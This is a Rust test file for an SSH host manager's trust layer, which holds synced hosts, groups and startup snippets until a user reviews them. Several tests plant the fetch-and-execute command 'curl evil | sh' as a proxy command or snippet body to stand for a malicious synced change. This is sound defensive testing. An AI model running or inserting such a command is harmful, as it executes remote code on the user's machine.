// SPDX-FileCopyrightText: 2026 Tauminus contributors
// SPDX-License-Identifier: GPL-3.0-or-later

use tauminus_domain::{Group, GroupId, Host, HostName, Label, Route, Settings, Snippet, SnippetId};

use super::*;
use crate::fakes::{FakeHostStore, FakeSnippetStore, FakeTrustStore};
use crate::ports::TrustStore;

fn hid(id: &str) -> HostId {
    HostId::parse(id).unwrap()
}

fn host(id: &str) -> Host {
    Host::new(
        hid(id),
        Label::parse(id).unwrap(),
        HostName::parse("db.internal").unwrap(),
    )
}

fn snippet(id: &str, body: &str) -> Snippet {
    Snippet::new(
        SnippetId::parse(id).unwrap(),
        Label::parse(id).unwrap(),
        None,
        body.into(),
    )
    .unwrap()
}

struct Fixture {
    hosts: HostBook,
    snippets: SnippetBook,
    notes: Arc<FakeTrustStore>,
    trust: Trust,
}

async fn fixture() -> Fixture {
    let notes = Arc::new(FakeTrustStore::default());
    Fixture {
        hosts: HostBook::open(Arc::new(FakeHostStore::default()))
            .await
            .unwrap(),
        snippets: SnippetBook::open(Arc::new(FakeSnippetStore::default()))
            .await
            .unwrap(),
        trust: Trust::open(notes.clone()).await.unwrap(),
        notes,
    }
}

impl Fixture {
    async fn data(&self) -> SyncData {
        SyncData {
            hosts: self.hosts.snapshot().await,
            snippets: self.snippets.snapshot().await,
        }
    }

    /// What `Syncer::run` does with a merge: note it, then save it.
    async fn sync(&self, after: SyncData) {
        let before = self.data().await;
        self.trust.note(&before, &after).await.unwrap();
        assert!(
            self.hosts
                .replace_if(&before.hosts, after.hosts)
                .await
                .unwrap()
        );
        assert!(
            self.snippets
                .replace_if(&before.snippets, after.snippets)
                .await
                .unwrap()
        );
    }

    async fn check(&self, id: &str) -> Result<(), TrustError> {
        self.trust
            .check(&self.hosts, Some(&self.snippets), &hid(id))
            .await
    }

    async fn review(&self, id: &str) -> Review {
        match self.check(id).await {
            Err(TrustError::NeedsReview(review)) => *review,
            other => panic!("{id} needs no review: {other:?}"),
        }
    }
}

#[tokio::test]
async fn a_host_from_another_device_waits_until_accepted_as_shown() {
    let f = fixture().await;
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    after.hosts.put_host(host("other")).unwrap();
    f.sync(after).await;
    let review = f.review("theirs").await;
    assert!(review.new);
    assert_eq!(review.lines[0].value, "db.internal");
    let page = f
        .trust
        .pending(&f.hosts, Some(&f.snippets), 1)
        .await
        .unwrap();
    assert_eq!(page.noted, 2);
    assert_eq!(page.reviews.len(), 1, "one page");
    assert_eq!(page.reviews[0].host, hid("other"));

    // Changed after it was shown: the user sees it again.
    f.hosts
        .edit(|inventory| {
            let mut h = host("theirs");
            h.settings.port = Some(2222);
            inventory.put_host(h)
        })
        .await
        .unwrap();
    let other = f.review("other").await;
    let stale = f
        .trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &[
                (hid("theirs"), review.fingerprint),
                (hid("other"), other.fingerprint),
            ],
        )
        .await
        .unwrap();
    assert_eq!(stale, [hid("theirs")], "accepted what the user did not see");
    f.check("other").await.unwrap();
    let now = f.review("theirs").await;
    let stale = f
        .trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &[(hid("theirs"), now.fingerprint)],
        )
        .await
        .unwrap();
    assert_eq!(stale, []);
    f.check("theirs").await.unwrap();
    let left = f
        .trust
        .pending(&f.hosts, Some(&f.snippets), 50)
        .await
        .unwrap();
    assert_eq!(left.reviews, []);
    // The next sync that leaves them as accepted drops the notes.
    f.sync(f.data().await).await;
    assert!(f.notes.saved().is_empty());
}

#[tokio::test]
async fn an_accept_between_a_note_and_its_save_holds_what_the_save_brings() {
    let f = fixture().await;
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    f.sync(after).await;
    let shown = f.review("theirs").await;
    // A sync notes, finding the host noted already, but has not saved.
    let before = f.data().await;
    let mut after = before.clone();
    let mut evil = host("theirs");
    evil.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
    after.hosts.put_host(evil).unwrap();
    f.trust.note(&before, &after).await.unwrap();
    // The user accepts what was shown, which is still what is saved.
    let stale = f
        .trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &[(hid("theirs"), shown.fingerprint)],
        )
        .await
        .unwrap();
    assert_eq!(stale, []);
    f.check("theirs").await.unwrap();
    // Then the sync saves: what it brought is held.
    assert!(
        f.hosts
            .replace_if(&before.hosts, after.hosts)
            .await
            .unwrap()
    );
    let held = f.check("theirs").await;
    assert!(matches!(held, Err(TrustError::NeedsReview(_))), "{held:?}");
}

#[tokio::test]
async fn a_note_another_window_saved_is_seen_here() {
    let notes = Arc::new(FakeTrustStore::default());
    let f = fixture().await;
    let other = Trust::open(notes.clone()).await.unwrap();
    let here = Trust::open(notes.clone()).await.unwrap();
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    other.note(&f.data().await, &after).await.unwrap();
    f.hosts
        .replace_if(&f.data().await.hosts, after.hosts)
        .await
        .unwrap();
    let seen = here
        .check(&f.hosts, Some(&f.snippets), &hid("theirs"))
        .await;
    assert!(matches!(seen, Err(TrustError::NeedsReview(_))), "{seen:?}");
}

#[tokio::test]
async fn a_synced_group_proxy_command_gates_its_hosts_and_local_edits_do_not() {
    let f = fixture().await;
    let group = Group {
        id: GroupId::parse("g").unwrap(),
        name: Label::parse("g").unwrap(),
        parent: None,
        settings: Settings::default(),
    };
    f.hosts
        .edit(|inventory| {
            inventory.put_group(group.clone())?;
            let mut h = host("mine");
            h.group = Some(group.id.clone());
            inventory.put_host(h)
        })
        .await
        .unwrap();
    // A local edit, outside a sync, is the user's own.
    f.hosts
        .edit(|inventory| {
            let mut g = group.clone();
            g.settings.port = Some(2200);
            inventory.put_group(g)
        })
        .await
        .unwrap();
    f.check("mine").await.unwrap();

    let mut after = f.data().await;
    let mut g = after.hosts.group(&group.id).unwrap().clone();
    g.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
    after.hosts.put_group(g).unwrap();
    f.sync(after).await;
    let review = f.review("mine").await;
    assert!(!review.new);
    assert!(
        review
            .lines
            .iter()
            .any(|l| l.level == 1 && l.field == "route" && l.value.contains("curl evil")),
        "{:?}",
        review.lines
    );

    // A second sync keeps what was approved, not what the first brought.
    let mut after = f.data().await;
    let mut g = after.hosts.group(&group.id).unwrap().clone();
    g.settings.route = None;
    after.hosts.put_group(g).unwrap();
    f.sync(after).await;
    f.check("mine").await.unwrap();
}

#[tokio::test]
async fn a_synced_snippet_edit_gates_the_hosts_it_starts_on() {
    let f = fixture().await;
    f.snippets
        .edit(|library| library.put(snippet("s", "uptime\n")))
        .await
        .unwrap();
    f.hosts
        .edit(|inventory| {
            let mut h = host("mine");
            h.startup = vec![SnippetId::parse("s").unwrap()];
            inventory.put_host(h)
        })
        .await
        .unwrap();
    let mut after = f.data().await;
    after
        .snippets
        .put(snippet("s", "curl evil | sh\n"))
        .unwrap();
    f.sync(after).await;
    assert_eq!(
        f.review("mine").await.startup,
        "curl evil | sh\r",
        "as typed"
    );

    // Snippets that cannot be read type nothing: still refused.
    let unread = f.trust.check(&f.hosts, None, &hid("mine")).await;
    assert!(
        matches!(unread, Err(TrustError::NeedsReview(_))),
        "{unread:?}"
    );
}

#[tokio::test]
async fn a_host_gone_loses_its_note_and_a_failed_save_keeps_the_old_notes() {
    let f = fixture().await;
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    f.sync(after).await;
    let mut after = f.data().await;
    after.hosts.remove_host(&hid("theirs")).unwrap();
    after.hosts.put_host(host("other")).unwrap();
    f.notes.fail_next();
    let before = f.data().await;
    assert!(f.trust.note(&before, &after).await.is_err());
    assert_eq!(f.notes.saved().len(), 1);
    f.review("theirs").await;
    f.sync(after).await;
    assert_eq!(f.notes.saved().keys().collect::<Vec<_>>(), [&hid("other")]);
}

#[test]
fn the_fingerprint_covers_every_line_and_the_startup_text() {
    let mut inventory = Inventory::default();
    let mut h = host("h");
    h.startup = vec![SnippetId::parse("s").unwrap()];
    inventory.put_host(h.clone()).unwrap();
    let mut library = Library::default();
    let print = |inventory: &Inventory, library: &Library| {
        fingerprint(inventory, library, &hid("h")).unwrap()
    };
    let missing = print(&inventory, &library);
    library.put(snippet("s", "ls\n")).unwrap();
    let ls = print(&inventory, &library);
    assert_ne!(missing, ls, "a snippet arriving under a skipped id");
    library.put(snippet("s", "ls -a\n")).unwrap();
    assert_ne!(print(&inventory, &library), ls);
    h.settings.forward_agent = Some(true);
    let before = print(&inventory, &library);
    inventory.put_host(h).unwrap();
    assert_ne!(print(&inventory, &library), before);
}

#[tokio::test]
async fn a_synced_removal_of_the_prod_tag_is_held() {
    let f = fixture().await;
    f.hosts
        .edit(|inventory| {
            let mut h = host("db");
            h.set_tags(vec![tauminus_domain::Tag::parse("prod").unwrap()])?;
            inventory.put_host(h)
        })
        .await
        .unwrap();
    let mut after = f.data().await;
    after.hosts.put_host(host("db")).unwrap();
    f.sync(after).await;
    f.review("db").await;
}

/// Notes another window dropped after this one read them: the first load
/// gives `stale`, every later one the store as it is.
struct Stale {
    first: std::sync::Mutex<Option<Approvals>>,
    store: FakeTrustStore,
}

impl TrustStore for Stale {
    fn load(
        &self,
    ) -> crate::ports::BoxFuture<'_, Result<(Arc<Approvals>, crate::ports::StoreVersion), StoreError>>
    {
        let stale = self.first.lock().unwrap().take();
        Box::pin(async move {
            let (now, version) = self.store.load().await?;
            Ok((stale.map_or(now, Arc::new), version))
        })
    }

    fn save<'a>(
        &'a self,
        approvals: &'a Approvals,
        read: crate::ports::StoreVersion,
    ) -> crate::ports::BoxFuture<'a, Result<(), StoreError>> {
        self.store.save(approvals, read)
    }
}

#[tokio::test]
async fn a_note_another_window_drops_meanwhile_is_made_again() {
    let f = fixture().await;
    f.hosts
        .edit(|inventory| inventory.put_host(host("x")))
        .await
        .unwrap();
    let before = f.data().await;
    let approved = fingerprint(&before.hosts, &before.snippets, &hid("x")).unwrap();
    let mut seen = Approvals::new();
    seen.insert(hid("x"), Some(approved));
    let store = Arc::new(Stale {
        first: std::sync::Mutex::new(Some(seen)),
        store: FakeTrustStore::default(),
    });
    let trust = Trust::open(store.clone()).await.unwrap();
    let mut after = before.clone();
    let mut evil = host("x");
    evil.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
    after.hosts.put_host(evil).unwrap();
    trust.note(&before, &after).await.unwrap();
    assert_eq!(store.store.saved().get(&hid("x")), Some(&Some(approved)));
}

#[tokio::test]
async fn an_accepted_host_stays_accepted_through_the_user_s_own_edit() {
    let f = fixture().await;
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    f.sync(after).await;
    let shown = f.review("theirs").await;
    f.trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &[(hid("theirs"), shown.fingerprint)],
        )
        .await
        .unwrap();
    let library = f.snippets.snapshot().await;
    let edit = |port| {
        let mut h = host("theirs");
        h.settings.port = Some(port);
        h
    };
    let (before, now) = f
        .hosts
        .edit_both(|inventory| inventory.put_host(edit(2222)))
        .await
        .unwrap();
    f.trust
        .rebase((&before, &library), (&now, &library))
        .await
        .unwrap();
    f.check("theirs").await.unwrap();

    // A sync saved other values between the edit and its rebase: held.
    let (before, now) = f
        .hosts
        .edit_both(|inventory| inventory.put_host(edit(2200)))
        .await
        .unwrap();
    let mut synced = f.data().await;
    let mut evil = edit(2200);
    evil.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
    synced.hosts.put_host(evil).unwrap();
    f.sync(synced).await;
    f.trust
        .rebase((&before, &library), (&now, &library))
        .await
        .unwrap();
    f.review("theirs").await;
}

#[tokio::test]
async fn a_local_edit_of_a_host_still_held_keeps_it_held() {
    let f = fixture().await;
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    f.sync(after).await;
    let shown = f.review("theirs").await;
    f.trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &[(hid("theirs"), shown.fingerprint)],
        )
        .await
        .unwrap();
    // Another device changes it; this one has not reviewed that.
    let mut after = f.data().await;
    let mut evil = host("theirs");
    evil.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
    after.hosts.put_host(evil.clone()).unwrap();
    f.sync(after).await;
    let library = f.snippets.snapshot().await;
    let (before, now) = f
        .hosts
        .edit_both(|inventory| {
            evil.settings.port = Some(2222);
            inventory.put_host(evil)
        })
        .await
        .unwrap();
    f.trust
        .rebase((&before, &library), (&now, &library))
        .await
        .unwrap();
    f.review("theirs").await;
}

#[tokio::test]
async fn a_snippet_a_sync_changes_after_the_user_lists_it_is_held() {
    let f = fixture().await;
    f.snippets
        .edit(|library| library.put(snippet("s2", "uptime\n")))
        .await
        .unwrap();
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    f.sync(after).await;
    let shown = f.review("theirs").await;
    f.trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &[(hid("theirs"), shown.fingerprint)],
        )
        .await
        .unwrap();
    // As the app does: the library is read before the host edit.
    let library = f.snippets.snapshot().await;
    let (before, now) = f
        .hosts
        .edit_both(|inventory| {
            let mut h = host("theirs");
            h.startup = vec![SnippetId::parse("s2").unwrap()];
            inventory.put_host(h)
        })
        .await
        .unwrap();
    let mut synced = f.data().await;
    synced
        .snippets
        .put(snippet("s2", "curl evil | sh\n"))
        .unwrap();
    f.sync(synced).await;
    f.trust
        .rebase((&before, &library), (&now, &library))
        .await
        .unwrap();
    f.review("theirs").await;
}
